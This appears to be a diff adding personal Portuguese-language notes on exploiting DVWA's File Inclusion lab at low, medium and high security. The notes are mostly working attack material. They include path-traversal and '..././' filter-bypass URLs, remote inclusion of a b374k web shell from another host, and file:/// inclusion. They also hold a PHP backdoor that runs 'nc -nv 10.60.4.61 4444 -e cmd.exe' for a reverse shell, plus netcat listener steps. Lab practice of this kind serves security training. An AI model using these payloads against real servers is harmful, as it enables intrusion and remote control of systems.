@@ -1,0 +1,159 @@
+Erro DVWA allow_url_include
+
+The PHP function allow_url_include is not enabled.
+
+1 = Para resolver este problema vá até o arquivo 
+
+C:\xampp\php\php.ini
+
+And change
+
+allow_url_include=Off
+
+to
+
+allow_url_include=On
+
+
+
+
+###############################################################################
+File Inclusion
+
+DVWA Security - LOW
+
+1 = Quando clicar em file1.php, o endereço será alterado para 
+
+http://10.60.4.63/DVWA/vulnerabilities/fi/?page=file1.php
+
+Caso, o site esteja vulnerável,irá conseguir transitar estre as pastas
+com o comando ../../login.php
+
+Exemplo:
+
+http://10.60.4.63/DVWA/vulnerabilities/fi/?page=../../login.php
+
+Exemplo o caminho original do site seria esteja
+
+C:\xampp\htdocs\DVWA\vulnerabilities\fi\file.php
+
+../ <= Cada comando deste, descemos uma pasta
+
+
+Aqui descemos até a pasta vulnerabilities e executamos a página login.php
+
+http://10.60.4.63/DVWA/vulnerabilities/fi/?page=../../login.php
+
+http://10.60.4.63/DVWA/vulnerabilities/fi/?page=../../phpinfo.php
+
+http://10.60.4.63/DVWA/vulnerabilities/fi/?page=../../security.txt
+
+http://10.60.4.63/DVWA/vulnerabilities/fi/?page=../../../../apache_stop.bat
+
+
+Aqui outra forma de explorar direcionando a conexão para outro site.
+
+http://10.60.4.63/DVWA/vulnerabilities/fi/?page=http://10.60.4.61/b374k/index.php
+
+Para uma conexão Remota utilize o arquivo test.php que está na pasta do File Inclusion
+
+
+
+
+
+2 = Para fazer a conexão remota, favor fazer o upload do arquivo backdoor.php no site
+http://10.60.4.63/DVWA/vulnerabilities/upload/
+
+//test.php
+
+<?php
+
+$output = ('cd /netcat && nc -nv 10.60.4.61 4444 -e cmd.exe');
+$cmd = shell_exec($output);
+echo "<pre>{$cmd}</pre>";
+
+?>
+
+
+E esse o endereço:
+
+http://10.60.4.63/DVWA/vulnerabilities/fi/?page=file1.php
+
+e mude para 
+
+http://10.60.4.63/DVWA/vulnerabilities/fi/?page=../../hackable/uploads/backdoor.php
+
+#Shell Linux
+
+
+Dentro do seu Shell no Linux favor executar o comando abaixo antes de entrar nesse site
+
++-[root]@[debian]:/home/brandon
++--> # nc -nvlp 4444
+
+
+
+##########################################################################################
+
+Medium
+
+1 = Para navegar entre as pastas ao invés de usarmos somente ../
+podemos usar "..././" cada conjunto destes diminui uma pasta 
+neste caso ficará desta forma para executar a backdoor.php
+
+http://10.60.4.63/DVWA/vulnerabilities/fi/?page=..././..././hackable/uploads/backdoor.php
+
+##########################################################################################
+
+HARD 
+
+1 = Para executar um arquivo externo deveremos navegar utilizando o comando file
+
+'file:///C:/xampp/htdocs/DVWA/login.php'
+
+Neste caso vamos executar o file logo abaixo, e vamos ver se vai funcionar
+
+10.60.4.63/DVWA/vulnerabilities/fi/?page=file:///C:/xampp/htdocs/DVWA/login.php
+
+Obs: Na dúvida, para ver se a navegação, utilizando o file está correta, pode abrir um navegador
+e colocar na URL
+
+file:/// <--- Para linux, sendo que a última '/' é para simbolizar a raiz do sistema.
+
+file:///C:/  <--- Aqui é para ir para raiz do sistema em windows
+
+Obs: Os comandos devem ser executados nos navegadores, referente
+ao sistema operacional correto. 
+
+2 = Vamos agora executar o backdoor que está no servidor
+
+10.60.4.63/DVWA/vulnerabilities/fi/?page=file:///C:/xampp/htdocs/DVWA/hackable/uploads/backdoor.php
+
+No terminal(Linux) digite
+
+nc -nvlp 4444
+
+###########################################################################################
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
